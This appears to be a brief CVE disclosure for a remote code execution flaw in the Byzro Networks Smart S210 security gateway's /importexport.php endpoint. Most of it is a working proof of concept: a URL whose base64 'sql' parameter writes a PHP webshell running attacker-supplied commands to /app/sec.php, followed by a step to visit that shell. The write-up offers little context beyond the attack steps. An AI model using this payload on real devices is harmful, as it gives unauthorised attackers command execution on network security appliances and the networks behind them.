There is an RCE vulnerability in the intelligent management platform of Byzro Networks Smart S210 multi-service security gateway.

version:S210

1. Vulnerability location
/importexport.php

2. The login interface is as shown in the figure.
![image](https://github.com/Stitch3612/cve/assets/134414721/6367a9b1-b83b-4111-b9fc-66cec4acfe06)

3. Construct POC and execute download
```https://ip:port/importexport.php?sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc2VjLnBocCc=&type=exportexcelbysql```
![image](https://github.com/Stitch3612/cve/assets/134414721/9cab7742-8cc5-414c-b4a0-a1b2e89c7f66)

5. Visit /app/sec.php to get the webshell.

![image](https://github.com/Stitch3612/cve/assets/134414721/ceb3d308-aa92-406a-95f9-0779cfc05ac6)
